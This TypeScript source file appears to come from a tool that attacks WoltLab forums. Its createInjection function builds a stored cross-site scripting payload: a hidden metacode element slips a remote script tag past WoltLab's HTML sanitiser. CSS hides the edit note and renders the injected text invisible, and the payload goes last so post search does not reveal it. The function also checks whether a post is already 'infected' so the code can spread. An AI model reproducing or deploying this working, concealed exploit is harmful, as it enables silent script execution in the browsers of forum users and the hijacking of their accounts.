import type { CreateInjectionOptions } from '@types';

/**
 * Depending on the length of the string:
 *
 * ```
 * return x.includes('<woltlab-metacode') && x.includes('data-name="yoshimitsu"') && x.includes('>');
 * ```
 *
 * or
 *
 * ```
 * const a = x.indexOf('<woltlab-metacode');
 *
 * if (a !== -1) {
 *   const b = x.indexOf('data-name="yoshimitsu"', a);
 *
 *   if (b !== -1) {
 *     const c = x.indexOf('>', b);
 *
 *     return c !== -1;
 *   }
 * }
 *
 * return false;
 * ```
 *
 * is faster, but it hardly makes a difference, which is why I have preferred the clearer and more legible variant here.
 */
const _WOLTLAB_METACODE_YOSHIMITSU_INJECTION_REGEX = /<woltlab-metacode.*?data-name="yoshimitsu".*?>/;

let woltlabStyleElementOuterHTML: string | null = null;

let styleElementOuterHTML: string | null = null;

/**
 * This is the key function of the exploit and contains the actual XSS exploit for WoltLab. A metacode element
 * is created here. These are handled specially by WoltLab, which is why they do not go through the HTML Purifier
 * process.
 *
 * The reason for this is that they contain meta information about the current post, which is already
 * processed by WoltLab itself.
 *
 * I tried many other approaches until I found this one. Even though it seems simple, the effort was immense,
 * which shows that open source is a huge obstacle for an accomplishment.
 *
 * A first giant step was thus made for me. Let's go on. The journey continues.
 */
export const createInjection = (text: string, scriptSrc: string, { data }: Partial<CreateInjectionOptions> = {}) => {
	// Check whether the content of a post has already been infected with this injection.
	if (_WOLTLAB_METACODE_YOSHIMITSU_INJECTION_REGEX.test(text)) {
		return { text, infected: true, infectedBefore: true };
	}

	if (!woltlabStyleElementOuterHTML) {
		const woltlabStyleElement = document.createElement('style');

		woltlabStyleElement.className = 'wbbPostEditNoteStyle';
		// `CSSStyleSheet.prototype.insertRule` respectively `HTMLStyleElement.prototype.sheet` only works
		// when the element is part of the active DOM.
		woltlabStyleElement.insertAdjacentText('beforeend', '.messageFooterNote.wbbPostEditNote { display: none; }');
		woltlabStyleElementOuterHTML = woltlabStyleElement.outerHTML;
	}

	if (!styleElementOuterHTML) {
		const styleElement = document.createElement('style');

		// `CSSStyleSheet.prototype.insertRule` respectively `HTMLStyleElement.prototype.sheet` only works
		// when the element is part of the active DOM.
		styleElement.insertAdjacentText('beforeend', '[title="yoshimitsu"] { display: none; }');
		styleElementOuterHTML = styleElement.outerHTML;
	}

	const metacodeElement = document.createElement('woltlab-metacode');
	metacodeElement.dataset.name = 'yoshimitsu';

	const scriptElement = document.createElement('script');
	scriptElement.src = scriptSrc;

	if (data) {
		Object.entries(data).forEach(([k, v]) => void (scriptElement.dataset[k] = v));
	}

	// In this case, `btoa` uses only ASCII-compatible characters, so there is no problem in using them.
	try {
		metacodeElement.dataset.attributes = btoa(
			JSON.stringify({
				test: styleElementOuterHTML + woltlabStyleElementOuterHTML + scriptElement.outerHTML,
			})
		);
	} catch {
		return { text, infected: false, infectedBefore: false };
	}

	const subElement = document.createElement('sub');
	subElement.appendChild(metacodeElement);

	const textElement = document.createElement('span');
	// An alpha value in a hex code for a color is filtered like #000000 and therefore does not work.
	// RGBA does work, however.
	textElement.style.color = 'rgba(0, 0, 0, 0)';
	// The smallest value for the font size is 8pt, everything below that will be rounded up to 8pt.
	textElement.style.fontSize = '8pt';
	textElement.appendChild(subElement);

	const containerElement = document.createElement('p');
	containerElement.appendChild(textElement);
	containerElement.title = 'yoshimitsu';

	return {
		// The injection must be the last element, otherwise it can be viewed directly through the post search.
		text: text + containerElement.outerHTML,
		infected: true,
		infectedBefore: false,
	};
};
